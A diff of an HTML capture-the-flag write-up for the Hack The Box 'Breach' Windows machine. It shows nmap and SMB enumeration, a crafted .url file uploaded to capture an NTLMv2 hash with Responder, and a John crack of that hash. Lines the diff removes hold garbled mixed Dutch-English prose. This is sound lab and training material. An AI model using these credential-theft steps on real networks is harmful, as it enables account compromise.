@@ -3,477 +3,188 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <title>Hack The Box :: Breach Writeup — Hackthekat</title>
   <meta name="description" content="HTB Breach machine writeup by Hackthekat">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet" type="text/css">
   <link rel="stylesheet" href="/main.css">
   <link rel="icon" type="image/png" href="/favicon.ico">
   <style>
-    /* ===== HTB WRITEUP PAGE ===== */
-    :root {
-      --htb-green: #9fef00;
-      --htb-green-soft: rgba(159,239,0,0.1);
-      --htb-bg: #0a0e14;
-      --htb-card: #11161d;
-      --htb-card-hover: #161c24;
-      --htb-border: #1f2832;
-      --htb-text: #c9d1d9;
-      --htb-muted: #6b7785;
-      --htb-easy: #9fef00;
-      --htb-medium: #ffaf00;
-      --htb-hard: #ff3838;
-      --htb-insane: #b372ff;
-      --htb-code-bg: #0d1117;
-    }
-
+    :root { --htb-green: #9fef00; --htb-bg: #0a0e14; --htb-card: #11161d; --htb-card-hover: #161c24; --htb-border: #1f2832; --htb-text: #c9d1d9; --htb-muted: #6b7785; --htb-easy: #9fef00; --htb-medium: #ffaf00; --htb-hard: #ff3838; --htb-insane: #b372ff; --htb-code-bg: #0d1117; }
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-    body {
-      background: var(--htb-bg);
-      color: var(--htb-text);
-      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-      font-size: 16px;
-      line-height: 1.7;
-      min-height: 100vh;
-    }
-
+    body { background: var(--htb-bg); color: var(--htb-text); font-family: 'Inter','Segoe UI', system-ui, sans-serif; font-size: 16px; line-height: 1.7; min-height: 100vh; }
     a { color: var(--htb-green); text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* ===== TOP NAV ===== */
-    .writeup-nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      background: rgba(10,14,20,0.95);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--htb-border);
-      padding: 0.9rem 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-    .writeup-nav .logo {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 1.05rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-    }
+    code { font-family: 'Monaco','Menlo',monospace; font-size: 0.88em; color: var(--htb-green); background: rgba(159,239,0,0.08); padding: 0.1em 0.35em; border-radius: 3px; }
+    .writeup-nav { position: sticky; top: 0; z-index: 100; background: rgba(10,14,20,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--htb-border); padding: 0.9rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .writeup-nav .logo { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 1.05rem; font-weight: 700; letter-spacing: 1px; }
     .writeup-nav .logo span { color: #fff; }
     .nav-sep { color: var(--htb-muted); margin: 0 0.2rem; }
     .nav-breadcrumb { color: var(--htb-muted); font-size: 0.9rem; }
     .nav-breadcrumb a { color: var(--htb-muted); }
     .nav-breadcrumb a:hover { color: var(--htb-green); }
-
-    /* ===== HERO ===== */
-    .writeup-hero {
-      position: relative;
-      background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%),
-                  linear-gradient(180deg, #0a0e14 0%, #0a0e14 100%);
-      padding: 4.5rem 2rem 3.5rem;
-      border-bottom: 1px solid var(--htb-border);
-      overflow: hidden;
-    }
-    .writeup-hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-      -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%);
-    }
-    .writeup-hero-inner {
-      position: relative;
-      z-index: 1;
-      max-width: 860px;
-      margin: 0 auto;
-      text-align: center;
-    }
-    .writeup-hero-prompt {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      color: var(--htb-green);
-      font-size: 0.9rem;
-      margin-bottom: 1.2rem;
-      opacity: 0.8;
-    }
+    .writeup-hero { position: relative; background: radial-gradient(ellipse at top, rgba(159,239,0,0.07), transparent 55%); padding: 4.5rem 2rem 3.5rem; border-bottom: 1px solid var(--htb-border); overflow: hidden; }
+    .writeup-hero::before { content: ''; position: absolute; inset: 0; background-image: linear-gradient(rgba(159,239,0,0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(159,239,0,0.025) 1px, transparent 1px); background-size: 40px 40px; pointer-events: none; mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 75%); }
+    .writeup-hero-inner { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; text-align: center; }
+    .writeup-hero-prompt { font-family: 'Monaco','Menlo',monospace; color: var(--htb-green); font-size: 0.9rem; margin-bottom: 1.2rem; opacity: 0.8; }
     .writeup-hero-prompt::before { content: '> '; }
-    .writeup-hero h1 {
-      font-size: 3.5rem;
-      font-weight: 700;
-      color: #fff;
-      letter-spacing: -1.5px;
-      line-height: 1.1;
-      margin-bottom: 1.2rem;
-    }
+    .writeup-hero h1 { font-size: 3.5rem; font-weight: 700; color: #fff; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 1.2rem; }
     .writeup-hero h1 .accent { color: var(--htb-green); }
-    .writeup-badges {
-      display: flex;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-wrap: wrap;
-      margin-bottom: 1.5rem;
-    }
-    .htb-badge {
-      font-size: 0.72rem;
-      padding: 0.25rem 0.75rem;
-      border-radius: 4px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      font-family: 'Monaco','Menlo',monospace;
-    }
+    .writeup-badges { display: flex; justify-content: center; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .htb-badge { font-size: 0.72rem; padding: 0.25rem 0.75rem; border-radius: 4px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.8px; font-family: 'Monaco','Menlo',monospace; }
     .os-linux { background: rgba(159,239,0,0.12); color: var(--htb-green); border: 1px solid rgba(159,239,0,0.35); }
     .os-windows { background: rgba(0,153,255,0.12); color: #0099ff; border: 1px solid rgba(0,153,255,0.35); }
     .diff-easy { background: rgba(159,239,0,0.12); color: var(--htb-easy); border: 1px solid rgba(159,239,0,0.35); }
     .diff-medium { background: rgba(255,175,0,0.12); color: var(--htb-medium); border: 1px solid rgba(255,175,0,0.35); }
     .diff-hard { background: rgba(255,56,56,0.12); color: var(--htb-hard); border: 1px solid rgba(255,56,56,0.35); }
     .diff-insane { background: rgba(179,114,255,0.12); color: var(--htb-insane); border: 1px solid rgba(179,114,255,0.35); }
-    .writeup-hero-tagline {
-      color: var(--htb-muted);
-      font-size: 0.95rem;
-      font-family: 'Monaco','Menlo',monospace;
-    }
-
-    /* ===== LAYOUT ===== */
-    .writeup-layout {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 3rem 2rem 5rem;
-    }
-
-    /* ===== CONTENT TYPOGRAPHY ===== */
-    .writeup-body p {
-      color: var(--htb-text);
-      margin: 1rem 0;
-      line-height: 1.75;
-    }
-    .writeup-body h2.writeup-section-title {
-      font-size: 1.75rem;
-      font-weight: 700;
-      color: #fff;
-      margin: 3rem 0 1rem;
-      padding-bottom: 0.6rem;
-      border-bottom: 1px solid var(--htb-border);
-      letter-spacing: -0.3px;
-    }
-    .writeup-body h2.writeup-section-title::before {
-      content: '# ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 1.1rem;
-    }
-    .writeup-body h3.writeup-sub-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #e6edf3;
-      margin: 2rem 0 0.75rem;
-    }
-    .writeup-body h3.writeup-sub-title::before {
-      content: '## ';
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.85rem;
-      opacity: 0.7;
-    }
-    .writeup-body h4.writeup-step-title {
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--htb-green);
-      margin: 1.5rem 0 0.5rem;
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 0.3px;
-    }
+    .writeup-hero-tagline { color: var(--htb-muted); font-size: 0.95rem; font-family: 'Monaco','Menlo',monospace; }
+    .writeup-layout { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    .writeup-body p { color: var(--htb-text); margin: 1rem 0; line-height: 1.75; }
+    .writeup-body h2.writeup-section-title { font-size: 1.75rem; font-weight: 700; color: #fff; margin: 3rem 0 1rem; padding-bottom: 0.6rem; border-bottom: 1px solid var(--htb-border); letter-spacing: -0.3px; }
+    .writeup-body h2.writeup-section-title::before { content: '# '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 1.1rem; }
+    .writeup-body h3.writeup-sub-title { font-size: 1.2rem; font-weight: 600; color: #e6edf3; margin: 2rem 0 0.75rem; }
+    .writeup-body h3.writeup-sub-title::before { content: '## '; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; font-size: 0.85rem; opacity: 0.7; }
+    .writeup-body h4.writeup-step-title { font-size: 1rem; font-weight: 600; color: var(--htb-green); margin: 1.5rem 0 0.5rem; font-family: 'Monaco','Menlo',monospace; letter-spacing: 0.3px; }
     .writeup-body h4.writeup-step-title::before { content: '→ '; opacity: 0.7; }
-
-    /* ===== CODE BLOCKS ===== */
-    .code-block {
-      background: var(--htb-code-bg);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      overflow: hidden;
-      position: relative;
-    }
-    .code-block::before {
-      content: '';
-      display: block;
-      height: 3px;
-      background: linear-gradient(90deg, var(--htb-green), transparent);
-    }
-    .code-block pre {
-      padding: 1.2rem 1.5rem;
-      overflow-x: auto;
-      margin: 0;
-    }
-    .code-block pre code {
-      font-family: 'Monaco','Menlo','Courier New',monospace;
-      font-size: 0.82rem;
-      color: #e6edf3;
-      line-height: 1.6;
-      white-space: pre;
-    }
-
-    /* ===== SCREENSHOTS ===== */
-    .screenshot-wrap {
-      margin: 1.5rem 0;
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 8px;
-      overflow: hidden;
-    }
-    .screenshot-wrap img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    .img-caption {
-      display: block;
-      padding: 0.5rem 1rem;
-      font-size: 0.8rem;
-      color: var(--htb-muted);
-      font-style: italic;
-      border-top: 1px solid var(--htb-border);
-    }
-
-    /* ===== FLAG BOXES ===== */
-    .flag-box {
-      background: rgba(159,239,0,0.06);
-      border: 1px solid rgba(159,239,0,0.3);
-      border-left: 4px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1rem 1.5rem;
-      margin: 1.5rem 0;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .flag-label {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      white-space: nowrap;
-    }
-    .flag-value {
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.8rem;
-      color: #e6edf3;
-      background: rgba(0,0,0,0.3);
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
-      word-break: break-all;
-    }
-
-    /* ===== ROOTED BOX ===== */
-    .rooted-box {
-      background: rgba(159,239,0,0.08);
-      border: 1px solid var(--htb-green);
-      border-radius: 8px;
-      padding: 1.2rem 1.5rem;
-      margin: 2rem 0;
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 700;
-      color: var(--htb-green);
-      font-family: 'Monaco','Menlo',monospace;
-      letter-spacing: 1px;
-    }
-
-    /* ===== INFO CARD (Machine Info) ===== */
-    .machine-info-card {
-      background: var(--htb-card);
-      border: 1px solid var(--htb-border);
-      border-radius: 12px;
-      padding: 1.5rem 2rem;
-      margin: 0 0 2.5rem 0;
-    }
-    .machine-info-card table {
-      width: 100%;
-      border-collapse: collapse;
-    }
-    .machine-info-card td {
-      padding: 0.4rem 1rem 0.4rem 0;
-      color: var(--htb-text);
-      font-size: 0.9rem;
-      vertical-align: top;
-    }
-    .machine-info-card td:first-child {
-      color: var(--htb-muted);
-      font-family: 'Monaco','Menlo',monospace;
-      font-size: 0.82rem;
-      white-space: nowrap;
-      width: 130px;
-    }
-
-    /* ===== BACK BUTTON ===== */
-    .back-link {
-      display: inline-flex;
-      align-items: center;
-      gap: 0.5rem;
-      color: var(--htb-muted);
-      font-size: 0.9rem;
-      font-family: 'Monaco','Menlo',monospace;
-      margin-bottom: 2.5rem;
-      transition: color 0.2s;
-    }
+    .code-block { background: var(--htb-code-bg); border: 1px solid var(--htb-border); border-radius: 8px; margin: 1.2rem 0; overflow: hidden; position: relative; }
+    .code-block::before { content: ''; display: block; height: 3px; background: linear-gradient(90deg, var(--htb-green), transparent); }
+    .code-block pre { padding: 1.2rem 1.5rem; overflow-x: auto; margin: 0; }
+    .code-block pre code { font-family: 'Monaco','Menlo',monospace; font-size: 0.82rem; color: #e6edf3; line-height: 1.6; white-space: pre; background: none; padding: 0; }
+    .screenshot-wrap { margin: 1.5rem 0; background: var(--htb-card); border: 1px solid var(--htb-border); border-radius: 8px; overflow: hidden; }
+    .screenshot-wrap img { width: 100%; height: auto; display: block; }
+    .img-caption { display: block; padding: 0.5rem 1rem; font-size: 0.8rem; color: var(--htb-muted); font-style: italic; border-top: 1px solid var(--htb-border); }
+    .flag-box { background: rgba(159,239,0,0.06); border: 1px solid rgba(159,239,0,0.3); border-left: 4px solid var(--htb-green); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .flag-label { font-size: 0.85rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; text-transform: uppercase; letter-spacing: 0.5px; white-space: nowrap; }
+    .flag-value { font-family: 'Monaco','Menlo',monospace; font-size: 0.8rem; color: #e6edf3; background: rgba(0,0,0,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; word-break: break-all; }
+    .rooted-box { background: rgba(159,239,0,0.08); border: 1px solid var(--htb-green); border-radius: 8px; padding: 1.2rem 1.5rem; margin: 2rem 0; text-align: center; font-size: 1.2rem; font-weight: 700; color: var(--htb-green); font-family: 'Monaco','Menlo',monospace; letter-spacing: 1px; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--htb-muted); font-size: 0.9rem; font-family: 'Monaco','Menlo',monospace; margin-bottom: 2.5rem; transition: color 0.2s; }
     .back-link:hover { color: var(--htb-green); text-decoration: none; }
-    .back-link::before { content: '←'; }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 768px) {
-      .writeup-hero h1 { font-size: 2.4rem; }
-      .writeup-layout { padding: 2rem 1.2rem 4rem; }
-      .writeup-nav { padding: 0.8rem 1.2rem; }
-    }
+    .back-link::before { content: '← '; }
+    @media (max-width: 768px) { .writeup-hero h1 { font-size: 2.4rem; } .writeup-layout { padding: 2rem 1.2rem 4rem; } .writeup-nav { padding: 0.8rem 1.2rem; } }
   </style>
 </head>
 <body>
-
-  <!-- Navigation -->
   <nav class="writeup-nav">
     <a href="/" class="logo">> <span>hackthekat</span></a>
     <span class="nav-sep">/</span>
-    <span class="nav-breadcrumb">
-      <a href="/writeups/">writeups</a>
-      <span class="nav-sep">/</span>
-      breach
-    </span>
+    <span class="nav-breadcrumb"><a href="/writeups/">writeups</a><span class="nav-sep">/</span>breach</span>
   </nav>
-
-  <!-- Hero -->
   <div class="writeup-hero">
     <div class="writeup-hero-inner">
       <div class="writeup-hero-prompt">hackthekat — writeup</div>
       <h1>Hack The Box: <span class="accent">Breach</span></h1>
       <div class="writeup-badges">
         <span class="htb-badge os-windows">Windows</span>
-        <span class="htb-badge diff-medium">Medium</span>
+        <span class="htb-badge diff-hard">Hard</span>
       </div>
       <div class="writeup-hero-tagline">Penetration Testing Writeup</div>
     </div>
   </div>
-
-  <!-- Main Content -->
   <div class="writeup-layout">
-    <a href="/writeups/" class="back-link"> Back to all writeups</a>
-
+    <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
-      <div class="machine-info-card">
-        <table>
-          <tr><td>Machine</td><td><strong>Breach</strong></td></tr>
-          <tr><td>Difficulty</td><td><span class="htb-badge diff-medium">Medium</span></td></tr>
-          <tr><td>OS</td><td><span class="htb-badge os-windows">Windows</span></td></tr>
-        </table>
-      </div>
+      <h2 class="writeup-section-title">Machine Overview</h2>
+      <p>Breach is a Hard difficulty Windows Active Directory machine. The attack begins with anonymous SMB access and a <strong>URL file NTLM theft attack</strong> to capture credentials. After collecting LDAP data for BloodHound, a <strong>Targeted Kerberoast</strong> attack against a MSSQL service account provides further credentials. A <strong>Silver Ticket</strong> is forged to gain access to the MSSQL server, and a reverse shell is obtained through <code>xp_cmdshell</code>. Privilege escalation exploits the <strong>SeImpersonatePrivilege</strong> using <strong>GodPotato</strong> to achieve SYSTEM-level access.</p>
+      <p><strong>Note:</strong> The user flag for this box is located in a non-standard directory: <code>C:\share\transfer</code>.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
-      <p>The User flag for this Box is located in a non-standard directory, C:\share\transfer.</p>
       <h3 class="writeup-sub-title">Port Scanning</h3>
-      <h4 class="writeup-step-title">Full Port scan</h4>
-      <p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+      <p>I begin with a full port scan to identify all open services.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ nmap 10.129.30.109
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 20:24 CET
 Nmap scan report for 10.129.30.109
 Host is up (0.018s latency).
 Not shown: 986 filtered tcp ports (no-response)
-PORT STATE SERVICE
-53/tcp open domain
-80/tcp open http
-88/tcp open kerberos-sec
-135/tcp open msrpc
-139/tcp open netbios-ssn
-389/tcp open ldap
-445/tcp open microsoft-ds
-464/tcp open kpasswd5
-593/tcp open http-rpc-epmap
-636/tcp open ldapssl
-3268/tcp open globalcatLDAP
-3269/tcp open globalcatLDAPssl
-3389/tcp open ms-wbt-server
-5985/tcp open wsman</code></pre></div>
-      <h4 class="writeup-step-title">Detailed port scan</h4>
-      <p>At the detailed port scan go to get more information from the host.</p>
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman</code></pre></div>
+      <p>A detailed service scan reveals typical AD ports including SMB, LDAP, Kerberos, MSSQL, and WinRM.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -sCV 10.129.30.109
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 20:25 CET
 Nmap scan report for 10.129.30.109
 Host is up (0.017s latency).
 
-PORT STATE SERVICE VERSION
-53/tcp open domain Simple DNS Plus
-80/tcp open http Microsoft IIS httpd 10.0
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
 | http-methods: 
-|_ Potentially risky methods: TRACE
+|_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
-88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-02 19:26:03Z)
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
-445/tcp open microsoft-ds?
-464/tcp open kpasswd5?
-593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
-636/tcp open tcpwrapped
-3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
-3269/tcp open tcpwrapped
-3389/tcp open ms-wbt-server Microsoft Terminal Services
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-02 19:26:03Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
 | rdp-ntlm-info: 
-| Target_Name: BREACH
-| NetBIOS_Domain_Name: BREACH
-| NetBIOS_Computer_Name: BREACHDC
-| DNS_Domain_Name: breach.vl
-| DNS_Computer_Name: BREACHDC.breach.vl
-| DNS_Tree_Name: breach.vl
-| Product_Version: 10.0.20348
-|_ System_Time: 2026-01-02T19:26:05+00:00
+|   Target_Name: BREACH
+|   NetBIOS_Domain_Name: BREACH
+|   NetBIOS_Computer_Name: BREACHDC
+|   DNS_Domain_Name: breach.vl
+|   DNS_Computer_Name: BREACHDC.breach.vl
+|   DNS_Tree_Name: breach.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-01-02T19:26:05+00:00
 |_ssl-date: 2026-01-02T19:26:44+00:00; 0s from scanner time.
 | ssl-cert: Subject: commonName=BREACHDC.breach.vl
 | Not valid before: 2025-09-07T08:04:48
-|_Not valid after: 2026-03-09T08:04:48
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_Not valid after:  2026-03-09T08:04:48
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 | smb2-time: 
-| date: 2026-01-02T19:26:09
-|_ start_date: N/A</code></pre></div>
-      <p>You can zien dat de smb port is open. Aangezien we nog geen username en password gevonden hebben zal ik een scan op de smb server proberen doen By using de anonymous user. This will I will doen door het onderstaande commando te gebruiken. Met het onderstaande commando gaan we zien of er een connectie met de anonymous user kan gemaakt worden en als er shared drives beschikbaar zijn en welke permissions ik hierop zal hebben.</p>
+|   date: 2026-01-02T19:26:09
+|_  start_date: N/A</code></pre></div>
+      <h2 class="writeup-section-title">Foothold: NTLM Theft via URL File</h2>
+      <h3 class="writeup-sub-title">Anonymous SMB Enumeration</h3>
+      <p>With no credentials yet, I scan the SMB server using the anonymous user. The scan reveals that anonymous access has <strong>read and write permissions</strong> on a share.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ smbmap -H 10.129.38.136 -u anonymous 
-[/] Enumerating shares... 
-[+] IP: 10.129.38.136:445 Name: breach.vl Status: Authenticated
- Disk Permissions Comment
- ---- ----------- -------
- ADMIN$ NO ACCESS Remote Admin
- C$ NO ACCESS Default share
- IPC$ READ ONLY Remote IPC
- NETLOGON NO ACCESS Logon server share 
- share READ, WRITE
- SYSVOL NO ACCESS Logon server share 
- Users READ ONLY
+[/] Enumerating shares...                                                  
+[+] IP: 10.129.38.136:445       Name: breach.vl                 Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        share                                                   READ, WRITE
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   READ ONLY
 [-] Closing connections..</code></pre></div>
-      <p>Zoals je above kan zien heeft de anonymous user lees en schrijf permissions op de share drive. I will dus nu een connectie met de shared drive will create door the following command te will use.</p>
+      <p>I connect to the share using <code>smbclient</code> and enumerate the contents, discovering a <code>transfer</code> directory containing several usernames.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ smbclient \\\\10.129.38.136\\share -U anonymous
 Password for [WORKGROUP\anonymous]:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt;</code></pre></div>
-      <h3 class="writeup-sub-title">URL File Attack &amp; Golden Ticket Attack</h3>
-      <p>I have dus gaan opzoeken want binnen de transfer dir hebben we een aantal usernames gevonden. I have will search for naar een ntlm theft methode waarmee we een .url file zullen will upload binnen de transfer folder en door een responder optezetten langs mijn kant daardoor de hash van de user te verkrijgen. I have for this de volgende url gebruikt. https://www.geeksforgeeks.org/ethical-hacking/url-file-attack-golden-ticket-attacks/ The URL-file attack typically abuses Windows shortcut/URL files (e.g., .url, .website, or shortcuts referencing UNC paths) so that, when a user opens the file, the OS or application attempts to contact a remote resource. That contact can cause the host to perform network authentication (often NTLM or Kerberos) to an attacker-controlled endpoint, leaking credentials or triggering authentication flows that attackers can abuse (relay, capture, or pivot).</p>
+      <h3 class="writeup-sub-title">URL File Attack for NTLM Hash Theft</h3>
+      <p>A <strong>URL file attack</strong> abuses Windows shortcut/URL files (.url, .website) that reference UNC paths. When a user opens or navigates to a folder containing such a file, Windows automatically attempts to authenticate to the attacker's SMB server — leaking NTLM credentials. I craft a malicious <code>.url</code> file, upload it to the transfer folder, and start <strong>Responder</strong> to capture the hash.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ cat @test.url 
 [InternetShortcut]
@@ -486,74 +197,78 @@ smb: \transfer\&gt; put @test.url
 putting file @test.url as \transfer\@test.url (0.9 kB/s) (average 7.2 kB/s)
 
 ┌──(kali㉿kali)-[~/HTB/Breach]
-└─$ sudo responder -I tun0 
+└─$ sudo responder -I tun0    
 
-[SMB] NTLMv2-SSP Client : 10.129.38.136
+[SMB] NTLMv2-SSP Client   : 10.129.38.136
 [SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
-[SMB] NTLMv2-SSP Hash : Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000</code></pre></div>
-      <p>I have de hash nu volledig gaan paste in een file so that ik deze kan will try cracken By using john.</p>
+[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000</code></pre></div>
+      <p>I save the captured NTLMv2 hash to a file and crack it using <strong>John the Ripper</strong>.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Breach]
 └─$ echo &#x27;Julia.Wong::BREACH:8aa33d32a44b2dee:BE14D830218DB685D56121B6D399E90C:01010000000000000037BBCEB483DC0140C5BD0792138C34000000000200080053004C004500560001001E00570049004E002D0047004C00520046003400380055004C004D005500460004003400570049004E002D0047004C00520046003400380055004C004D00550046002E0053004C00450056002E004C004F00430041004C000300140053004C00450056002E004C004F00430041004C000500140053004C00450056002E004C004F00430041004C00070008000037BBCEB483DC0106000400020000000800300030000000000000000100000000200000F3606FD1211B4A109903917F3DBFD212588D1367A422F5BA8C2C2E9A6B0452380A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350034000000000000000000&#x27; &gt; hash
 
 ┌──(kali㉿kali)-[~/HTB/Breach]
-└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
-Computer1 (Julia.Wong)</code></pre></div>
-      <p>I have deze user credentials will use voor in te loggen op de smb server. You can do this doen door het onderstaande commando uittevoeren.</p>
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt         
+Computer1        (Julia.Wong)</code></pre></div>
+      <h3 class="writeup-sub-title">SMB & LDAP Enumeration with Credentials</h3>
